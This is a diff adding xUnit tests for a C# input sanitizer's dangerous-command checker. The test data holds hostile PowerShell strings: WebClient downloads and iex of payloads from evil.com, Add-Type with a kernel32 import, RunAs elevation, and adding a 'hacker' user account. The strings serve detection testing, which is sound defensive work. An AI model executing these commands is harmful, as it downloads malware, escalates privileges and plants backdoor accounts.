@@ -276,6 +276,47 @@ public class InputSanitizerTests
         Assert.Contains("encoded", result, StringComparison.OrdinalIgnoreCase);
     }
 
+    [Theory]
+    [InlineData("(New-Object System.Net.WebClient).DownloadString('http://evil.com/payload')")]
+    [InlineData("$wc = New-Object Net.WebClient; $wc.DownloadFile('http://evil.com/mal.exe','C:\\mal.exe')")]
+    [InlineData("(New-Object System.Net.WebClient).DownloadData('http://evil.com')")]
+    public void CheckDangerousCommand_DotNetDownload_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("download", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Theory]
+    [InlineData("Invoke-Expression (Get-Content payload.ps1)")]
+    [InlineData("iex (New-Object Net.WebClient).DownloadString('http://evil.com')")]
+    [InlineData("iex('whoami')")]
+    public void CheckDangerousCommand_InvokeExpression_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+    }
+
+    [Theory]
+    [InlineData("Add-Type -TypeDefinition 'using System; public class Evil { }'")]
+    [InlineData("Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")] ...'")]
+    public void CheckDangerousCommand_AddTypeInlineCode_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("Add-Type", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Theory]
+    [InlineData("Start-Process powershell -Verb RunAs")]
+    [InlineData("Start-Process cmd -ArgumentList '/c net user hacker P@ss /add'")]
+    public void CheckDangerousCommand_StartProcessShell_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("Start-Process", result, StringComparison.OrdinalIgnoreCase);
+    }
+
     [Fact]
     public void CheckDangerousCommand_CaseInsensitive()
     {
